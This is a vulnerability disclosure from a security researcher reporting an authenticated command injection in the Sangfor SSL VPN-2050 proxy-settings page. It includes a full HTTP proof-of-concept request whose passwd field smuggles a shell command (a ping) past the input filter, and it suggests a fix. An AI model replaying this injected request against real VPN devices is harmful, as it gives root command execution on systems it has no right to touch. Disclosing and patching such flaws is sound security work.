Hi,

I am eack from Codesafe Team of Legendsec at Qi'anxin Group.
Recently, I found that the Sangfor SSL VPN-2050 has a command injection vulnerability. The attacker can obtain the root shell and execute arbitrary commands. The tested device firmware version is M7.6.3. The vulnerability details are as follows:
The vulnerability exists in gcs_webui.cgi, which corresponds to the password option under "System Maintenance - Proxy Settings" on the administration page.

Vulnerability code:
![2.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190626/1561536896867468.png)
The name parameter is filtered by the input_filter function, but the passwd parameter is not filtered, and it enters the call_DoShellProxy function. In this function, the popen execution command is finally called:
![4.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190626/1561537041874305.png)

The payload of the vulnerability recurrence is as follows:

GET /cgi-bin/gcs_webui.cgi?requestarg=2&requestname=17&csrf=cb9a5d4dc06ce4cad3afc633b966ef4c&enabled=1&ip=10.10.10.10&port=111&auth=1&name=aaa&passwd=123';ping%2010.92.2.110' HTTP/1.1
Host: 10.92.2.17:4430
Connection: close
Accept: /
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Referer: https://10.92.2.17:4430/html/gcs_proxyset.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: language=zh_CN; TWFID=1a000798af849707; g_LoginPage=login_psw; VisitTimes=0; haveLogin=0; VpnLine=http%3A%2F%2F10.92.2.17%2F; sinfor_session_id=WA16F9E951F925B56F78666EFBF6DB22; PHPSESSID=e116e0e2c17bed877d1f825a77e6babf; usermrgstate=%7B%22params%22%3A%7B%22grpid%22%3A%22-100%22%2C%22recflag%22%3A0%2C%22filter%22%3A0%7D%2C%22pageparams%22%3A%7B%22start%22%3A0%2C%22limit%22%3A25%7D%2C%22otherparams%22%3A%7B%22searchtype%22%3A0%2C%22recflag%22%3Afalse%7D%7D; hidecfg=%7B%22name%22%3Afalse%2C%22flag%22%3Afalse%2C%22note%22%3Afalse%2C%22expire%22%3Atrue%2C%22lastlogin_time%22%3Atrue%2C%22phone%22%3Atrue%2C%22allocateip%22%3Atrue%2C%22other%22%3Afalse%2C%22state%22%3Afalse%7D; x-anti-csrf-gcs=29101CC400B01C4E

By capturing the packet, you can see that the command is executed:
![5.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190626/1561537784254353.png)
The vulnerability was tested successfully on both 4430 and 1000 ports.
Can fix the vulnerability by filtering the passwd parameter.

Best wishes 
